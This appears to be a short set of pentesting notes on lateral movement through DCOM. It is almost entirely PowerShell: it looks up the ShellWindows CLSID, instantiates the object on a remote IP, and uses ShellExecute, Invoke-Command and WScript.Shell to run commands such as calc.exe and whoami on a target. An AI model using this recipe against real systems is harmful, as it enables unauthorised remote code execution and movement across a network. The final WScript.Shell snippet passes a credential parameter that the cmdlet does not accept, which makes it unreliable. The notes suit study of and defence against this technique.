Execute DCOM

__OLEVIEW__
AppIds > ShellWindows
CLSID 	9BA05972-F6A8-11CF-A442-00A0C90A8F39

Now that we have the CLSID, we can instantiate the object on a remote target:
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)

# create a remote instance of 'ShellWindows'
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "127.0.0.1") 
$obj = [System.Activator]::CreateInstance($com)

# interact with the object
$item = $obj.Item()
$item

# create a shellexecute command 
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)

Invoke-Command -ComputerName "xxxxx" -ScriptBlock { cmd.exe /c 'whoami' } -Credential $credential

# Specify the target computer
$targetComputer = "COMPUTERNAME"

# Use the computer account credentials for authentication
$credential = Get-Credential -UserName "$targetComputer\$($env:COMPUTERNAME)" -Message "Enter computer account credentials"


# Create a DCOM object
$dcom = New-Object -ComObject "WScript.Shell" -Credential $credential
$command = "cmd.exe /c whoami"
$dcom.Run($command, 1, $true)
